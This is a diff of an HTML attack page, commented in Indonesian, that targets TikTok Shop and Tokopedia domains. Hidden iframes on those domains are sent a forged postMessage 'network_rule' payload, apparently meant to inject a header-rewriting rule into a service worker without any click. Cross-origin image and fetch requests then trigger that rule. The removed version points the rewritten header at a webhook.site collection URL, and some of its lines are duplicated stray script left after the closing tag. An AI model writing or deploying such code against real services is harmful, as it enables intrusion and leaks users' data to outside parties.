@@ -1,75 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Updating...</title></head>
+<head><title>System Loading...</title></head>
 <body>
-    <h1 id="log">Initializing Zero-Click...</h1>
-    <iframe id="gate1" src="https://shop-id.tokopedia.com/robots.txt" style="display:none;"></iframe>
-    <iframe id="gate2" src="https://shop-id.tokopedia.com/manifest.json" style="display:none;"></iframe>
+    <iframe id="target" src="https://api-verification.tiktokshop.com/robots.txt" style="display:none;"></iframe>
 
     <script>
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
+        const frame = document.getElementById('target');
         const payload = {
             source: "main_thread",
             eventName: "network_rule",
             data: [{
-                ruleName: "bypass_100000",
+                ruleName: "slardar_bypass",
                 global: true,
                 conditions: [],
                 handlers: [{
                     handler: "replace",
                     type: "header",
                     field: "X-Pns-Referrer",
-                    value: webhook
+                    value: "VULN_BYPASS_LOGGING"
                 }]
             }]
         };
 
-        function shoot(target) {
-            try {
-                target.contentWindow.postMessage(payload, "*");
-                console.log("Shot fired to: " + target.src);
-            } catch(e) {}
-        }
-
-        window.onload = function() {
-            // Spam postMessage selama 5 detik pertama
-            let attempts = 0;
-            const interval = setInterval(() => {
-                shoot(document.getElementById('gate1'));
-                shoot(document.getElementById('gate2'));
-                attempts++;
-                if(attempts > 20) clearInterval(interval);
-            }, 500);
-
-            // Trigger fetch setelah 8 detik
+        frame.onload = function() {
+            console.log("Infiltrating Service Worker context...");
+            // Kirim payload ke context domain tiktokshop
+            frame.contentWindow.postMessage(payload, "*");
+            
+            // Trigger fetch untuk memastikan rule aktif
             setTimeout(() => {
-                document.getElementById('log').innerText = "Triggering Webhook...";
-                // Trigger via Image (No-Cors)
                 const img = new Image();
-                img.src = "https://shop-id.tokopedia.com/favicon.ico?v=" + Date.now();
-                
-                // Trigger via Fetch
-                fetch("https://shop-id.tokopedia.com/robots.txt", { mode: 'no-cors' });
-            }, 8000);
+                img.src = "https://api-verification.tiktokshop.com/favicon.ico?trigger=" + Date.now();
+            }, 3000);
         };
-    </script>
-</body>
-</html>
-        // Jalankan injeksi berkali-kali untuk memastikan SW menangkapnya
-        const interval = setInterval(attemptInjection, 500);
-
-        // Berhenti setelah 10 detik dan paksa pemicuan fetch
-        setTimeout(() => {
-            clearInterval(interval);
-            console.log("Triggering fetch event...");
-            
-            // Cara paling ampuh trigger SW fetch tanpa klik: Image tag cross-origin
-            const img = new Image();
-            img.src = "https://shop-id.tokopedia.com/favicon.ico?cache=" + Math.random();
-            
-            // Atau fetch via script
-            fetch("https://shop-id.tokopedia.com/robots.txt", { mode: 'no-cors' });
-        }, 10000);
     </script>
 </body>
 </html>
